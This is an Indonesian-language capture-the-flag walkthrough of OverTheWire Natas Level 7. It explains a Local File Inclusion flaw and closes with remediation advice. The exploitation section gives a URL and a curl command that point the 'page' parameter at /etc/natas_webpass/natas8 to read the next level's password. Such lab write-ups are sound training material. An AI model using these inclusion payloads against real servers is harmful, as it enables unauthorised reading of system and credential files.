---
title: "Level 7"
description: Eksploitasi Local File Inclusion untuk membaca berkas server.
sidebarTitle: "Level 7 — Local File Inclusion"
---

## Profil

- **Target:** `http://natas7.natas.labs.overthewire.org`
- **Kredensial:** `natas7` / (*password* dari Level 6)

## Pengintaian

Laman memuat dua pranala "Home" dan "About". URL mengungkapkan adanya parameter:

```
index.php?page=home
index.php?page=about
```

Hal ini mengindikasikan bahwa parameter `page` diteruskan ke fungsi `include()` atau `require()` PHP — sebuah pola klasik dari kerentanan *Local File Inclusion* (LFI).

## Analisis

Ketika suatu aplikasi menggunakan masukan pengguna untuk membangun jalur berkas tanpa sanitasi yang memadai, penyerang dapat membaca berkas sembarang (*arbitrary file*). Petunjuk dalam sumber laman menegaskan bahwa *password* target tersimpan di:

```
/etc/natas_webpass/natas8
```

## Eksploitasi

Ubah parameter `page` untuk mengarah pada berkas *password*:

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

Server menyertakan berkas tersebut langsung ke dalam respons, sehingga membocorkan isinya.

Perintah yang sama dapat dilakukan dengan `curl`:

```bash
curl -u natas7:$(cat password7) \
  "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

## Remediasi

- Jangan sekali-kali memberikan masukan pengguna secara langsung ke fungsi `include()`, `require()`, atau fungsi *filesystem*
- Gunakan mekanisme *whitelist* terhadap nilai halaman yang diizinkan
- Nonaktifkan fungsi PHP yang berbahaya apabila tidak diperlukan
